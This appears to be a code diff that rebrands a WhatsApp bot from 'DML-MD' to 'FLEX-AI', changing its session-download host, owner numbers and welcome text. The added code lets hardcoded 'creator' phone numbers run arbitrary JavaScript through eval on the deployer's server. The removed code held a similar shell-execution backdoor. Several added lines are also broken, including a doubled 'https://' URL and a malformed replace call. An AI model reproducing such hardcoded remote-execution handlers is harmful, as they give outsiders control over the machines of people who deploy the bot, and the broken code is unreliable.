@@ -28,24 +28,23 @@ const {
   const fs = require('fs')
   const ff = require('fluent-ffmpeg')
   const P = require('pino')
+  const zlib = require('zlib')
   const config = require('./config')
-  const GroupEvents = require('./lib/groupevents');
   const qrcode = require('qrcode-terminal')
   const StickersTypes = require('wa-sticker-formatter')
   const util = require('util')
   const { sms, downloadMediaMessage, AntiDelete } = require('./lib')
   const FileType = require('file-type');
   const axios = require('axios')
- const zlib = require('zlib')
+  const { File } = require('megajs')
   const { fromBuffer } = require('file-type')
   const bodyparser = require('body-parser')
   const os = require('os')
   const Crypto = require('crypto')
   const path = require('path')
   const prefix = config.PREFIX
-
-  const callHandler = require('./lib/callhandler');
-  const ownerNumber = ['255622220680']
+  
+  const ownerNumber = ['255759637644']
   
   const tempDir = path.join(os.tmpdir(), 'cache-temp')
   if (!fs.existsSync(tempDir)) {
@@ -65,7 +64,8 @@ const {
   
   // Clear the temp directory every 5 minutes
   setInterval(clearTempDir, 5 * 60 * 1000);
-//===================SESSION-AUTH============================
+  
+  //===================SESSION-AUTH============================
 async function authentification() {
     try {
         const sessionDir = path.join(__dirname, "sessions");
@@ -85,7 +85,7 @@ async function authentification() {
 
             let sessionData;
             if (/^[a-zA-Z0-9]+_[a-z0-9]{5}$/i.test(config.SESSION_ID)) {
-                const sessionUrl = `https://session-connect.pages.dev/${config.SESSION_ID}.json`;
+                const sessionUrl = `https://https://flex-ai-web.pages.dev/${config.SESSION_ID}.json`;
                 try {
                     const response = await axios.get(sessionUrl);
                     sessionData = response.data;
@@ -97,10 +97,10 @@ async function authentification() {
             }
 
             // Handle DML-MD;;; session string
-            if (sessionData.startsWith('DML-MD;;;')) {
+            if (sessionData.startsWith('FLEX-AI;;;')) {
                 const [header, b64data] = sessionData.split(';;;');
 
-                if (header !== "DML-MD" || !b64data) {
+                if (header !== "FLEX-AI" || !b64data) {
                     throw new Error("Invalid DML-MD session format");
                 }
 
@@ -112,13 +112,13 @@ async function authentification() {
                     const parsedData = JSON.parse(decompressedData.toString());
 
                     if (!parsedData.noiseKey || !parsedData.signedIdentityKey) {
-                        throw new Error("Invalid session structure in DML-MD format");
+                        throw new Error("Invalid session structure in FLEX-AI format");
                     }
 
                     fs.writeFileSync(credsPath, decompressedData, "utf8");
-                    console.log("✅ DML-MD session loaded successfully");
+                    console.log("✅ FLEX-AI session loaded successfully");
                 } catch (parseError) {
-                    throw new Error(`Invalid DML-MD session data: ${parseError.message}`);
+                    throw new Error(`Invalid FLEX-AI session data: ${parseError.message}`);
                 }
             } // Handle BWM-XMD;;; session string
             else if (sessionData.startsWith('BWM-XMD;;;')) {
@@ -145,7 +145,7 @@ async function authentification() {
                     throw new Error(`Invalid BWM-XMD session data: ${parseError.message}`);
                 }
             } else {
-                throw new Error("Invalid session format - must be DML-MD;;; or BWM-XMD;;; format or a valid session ID");
+                throw new Error("Invalid session format - must be FLEX-AI;;; or BWM-XMD;;; format or a valid session ID");
             }
         } else {
             console.log("Using existing session...");
@@ -199,38 +199,8 @@ const port = process.env.PORT || 9090;
   console.log('Plugins installed successful ✅')
   console.log('Bot connected to whatsapp ✅')
   
-  let up = `╭━━━[  WELCOME LEGEND ]━╮
-┃
-┃   🤖 *BOT NAME:*   DML-MD  
-┃   ⚡ *Mode:*        Ultrasonic Speed  
-┃   🛰️ *Assistant:*  Your WhatsApp Sidekick  
-┃   ❤️ *Status:*     Powered by YOU!
-┃
-╰━━━━━━━━━━━━━━━━━━━━━╯
-
-📌 *QUICK NAVIGATION:*
-
-╭──────────────────────╮
-│ 🔗 *Join Channel:*  
-│    📲 [Click Here](https://whatsapp.com/channel/0029Vb2hoPpDZ4Lb3mSkVI3C)
-│
-│ ⭐ *Star on GitHub:*  
-│    🌟 [Support Us](https://github.com/MLILA17/DML-MD)
-│
-│ 🛠️ *Current Prefix:* \`${prefix}\`
-╰──────────────────────╯
-
-💡 _Tip: Type \`${prefix}menu\` to explore all features!_
-
-───────────────
-👨‍💻 *Coded with 💙 by Daudi M. Mlila*  
-🔐 *Secure. Fast. Reliable.*  
-📅 *© 2025 | DML-MD PROJECT*
-───────────────`;
-    conn.sendMessage(conn.user.id, { image: { url: `https://files.catbox.moe/reypkp.jpg` }, caption: up })
-      // --- Initialize the call handler ---
-            callHandler(conn, config.ANTICALL); 
-            // ---------------------------------------------
+  let up = `*Hello there 𝐅𝐋𝐄𝐗 𝐀𝐈 User! \ud83d\udc4b\ud83c\udffb* \n\n> Simple , Straight Forward But Loaded With Features \ud83c\udf8a, Meet DAVINCS WhatsApp Bot.\n\n *Thanks for using 𝐅𝐋𝐄𝐗 𝐀𝐈 \ud83d\udea9* \n\n> Join WhatsApp Channel :- ⤵️\n \nhttps://whatsapp.com/channel/0029VakSTEQGZNCk6CqE9E2P\n\n- *YOUR PREFIX:* = ${prefix}\n\nDont forget to give star to repo ⬇️\n\nhttps://github.comallan-davincs/FLEX-AI\n\n> © ENIGINE CORE BY 𝑨𝑳𝑳𝑨𝑵 𝑫𝑨𝑽𝑰𝑵𝑪𝑺 TECHX \ud83d\udda4`;
+    conn.sendMessage(conn.user.id, { image: { url: `https://files.catbox.moe/oc5rvp.jpg` }, caption: up })
   }
   })
   conn.ev.on('creds.update', saveCreds)
@@ -246,9 +216,7 @@ const port = process.env.PORT || 9090;
     }
   });
   //============================== 
-
-  conn.ev.on("group-participants.update", (update) => GroupEvents(conn, update));	  
-	  
+          
   //=============readstatus=======
         
   conn.ev.on('messages.upsert', async(mek) => {
@@ -269,7 +237,7 @@ const port = process.env.PORT || 9090;
     }
   if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === "true"){
     const jawadlike = await conn.decodeJid(conn.user.id);
-    const emojis = ['❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '🇹🇿', '💜', '💙', '🌝', '🖤', '💚'];
+    const emojis = ['❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '🇵🇰', '💜', '💙', '🌝', '🖤', '💚'];
     const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
     await conn.sendMessage(mek.key.remoteJid, {
       react: {
@@ -316,45 +284,59 @@ const port = process.env.PORT || 9090;
   const reply = (teks) => {
   conn.sendMessage(from, { text: teks }, { quoted: mek })
   }
-
   const udp = botNumber.split('@')[0];
-    const jawadop = ('255785591288', '255713541112', '255785561288');
-    
-    const ownerFilev2 = JSON.parse(fs.readFileSync('./lib/sudo.json', 'utf-8'));  
-    
-    let isCreator = [udp, ...jawadop, config.DEV + '@s.whatsapp.net', ...ownerFilev2]
-    .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net') 
-    .includes(mek.sender);
-	  
+    const jawad = ('255759637644', '255656582542');
+    let isCreator = [udp, jawad, config.DEV]
+					.map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
+					.includes(mek.sender);
 
-	  if (isCreator && mek.text.startsWith("&")) {
-            let code = budy.slice(2);
-            if (!code) {
-                reply(`Provide me with a query to run Master!`);
-                return;
-            }
-            const { spawn } = require("child_process");
-            try {
-                let resultTest = spawn(code, { shell: true });
-                resultTest.stdout.on("data", data => {
-                    reply(data.toString());
-                });
-                resultTest.stderr.on("data", data => {
-                    reply(data.toString());
-                });
-                resultTest.on("error", data => {
-                    reply(data.toString());
-                });
-                resultTest.on("close", code => {
-                    if (code !== 0) {
-                        reply(`command exited with code ${code}`);
-                    }
-                });
-            } catch (err) {
-                reply(util.format(err));
-            }
-            return;
-	  }	  
+    if (isCreator && mek.text.startsWith('%')) {
+					let code = budy.slice(2);
+					if (!code) {
+						reply(
+							`Provide me with a query to run Master!`,
+						);
+						return;
+					}
+					try {
+						let resultTest = eval(code);
+						if (typeof resultTest === 'object')
+							reply(util.format(resultTest));
+						else reply(util.format(resultTest));
+					} catch (err) {
+						reply(util.format(err));
+					}
+					return;
+				}
+    if (isCreator && mek.text.startsWith('$')) {
+					let code = budy.slice(2);
+					if (!code) {
+						reply(
+							`Provide me with a query to run Master!`,
+						);
+						return;
+					}
+					try {
+						let resultTest = await eval(
+							'const a = async()=>{\n' + code + '\n}\na()',
+						);
+						let h = util.format(resultTest);
+						if (h === undefined) return console.log(h);
+						else reply(h);
+					} catch (err) {
+						if (err === undefined)
+							return console.log('error');
+						else reply(util.format(err));
+					}
+					return;
+				}
+ //================ownerreact==============
+    
+if (senderNumber.includes("255759637644") && !isReact) {
+  const reactions = ["👑", "💀", "📊", "⚙️", "🧠", "🎯", "📈", "📝", "🏆", "🌍", "🇵🇰", "💗", "❤️", "💥", "🌼", "🏵️", ,"💐", "🔥", "❄️", "🌝", "🌚", "🐥", "🧊"];
+  const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
+  m.react(randomReaction);
+}
 
   //==========public react============//
   
@@ -375,7 +357,7 @@ if (!isReact && config.AUTO_REACT === 'true') {
         '📑', '📉', '📂', '🔖', '🧷', '📌', '📝', '🔏', '🔐', '🩷', '❤️', '🧡', '💛', '💚', 
         '🩵', '💙', '💜', '🖤', '🩶', '🤍', '🤎', '❤‍🔥', '❤‍🩹', '💗', '💖', '💘', '💝', '❌', 
         '✅', '🔰', '〽️', '🌐', '🌀', '⤴️', '⤵️', '🔴', '🟢', '🟡', '🟠', '🔵', '🟣', '⚫', 
-        '⚪', '🟤', '🔇', '🔊', '📢', '🔕', '♥️', '🕐', '♻', '🇹🇿'
+        '⚪', '🟤', '🔇', '🔊', '📢', '🔕', '♥️', '🕐', '🚩', '🇵🇰'
     ];
 
     const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
@@ -392,26 +374,11 @@ if (!isReact && config.CUSTOM_REACT === 'true') {
     m.react(randomReaction);
 }
         
-  //==========Sudo and Mode ============ 
-
-	  
-// ban users 
-
-const bannedUsers = JSON.parse(fs.readFileSync('./lib/ban.json', 'utf-8'));
-const isBanned = bannedUsers.includes(sender);
-
-if (isBanned) return; // Ignore banned users completely
-	  
-  const ownerFile = JSON.parse(fs.readFileSync('./lib/sudo.json', 'utf-8'));  // Dml 
-  const ownerNumberFormatted = `${config.OWNER_NUMBER}@s.whatsapp.net`;
-  // json file setup
-  const isFileOwner = ownerFile.includes(sender);
-  const isRealOwner = sender === ownerNumberFormatted || isMe || isFileOwner;
-  // mode settings 
-  if (!isRealOwner && config.MODE === "private") return;
-  if (!isRealOwner && isGroup && config.MODE === "inbox") return;
-  if (!isRealOwner && !isGroup && config.MODE === "groups") return;
-	  
+  //==========WORKTYPE============ 
+  if(!isOwner && config.MODE === "private") return
+  if(!isOwner && isGroup && config.MODE === "inbox") return
+  if(!isOwner && !isGroup && config.MODE === "groups") return
+   
   // take commands 
                  
   const events = require('./command')
@@ -845,7 +812,7 @@ if (isBanned) return; // Ignore banned users completely
                         global.email
                     }\nitem2.X-ABLabel:GitHub\nitem3.URL:https://github.com/${
                         global.github
-                    }/khan-xmd\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${
+                    }/FLEX-AI\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${
                         global.location
                     };;;;\nitem4.X-ABLabel:Region\nEND:VCARD`,
                 });
@@ -886,16 +853,9 @@ if (isBanned) return; // Ignore banned users completely
   }
   
   app.get("/", (req, res) => {
-  res.send("DML-MD STARTED ✅");
+  res.send("𝐅𝐋𝐄𝐗 𝐐𝐔𝐀𝐍𝐓𝐔𝐌 STARTED ✅");
   });
   app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));
-
-  async function start() {
-    try {
-      await authentification();
-      connectToWA();
-    } catch (error) {
-      console.error("Failed to start the bot:", error);
-    }
-  }
-  start();
+  setTimeout(() => {
+  connectToWA()
+  }, 4000);
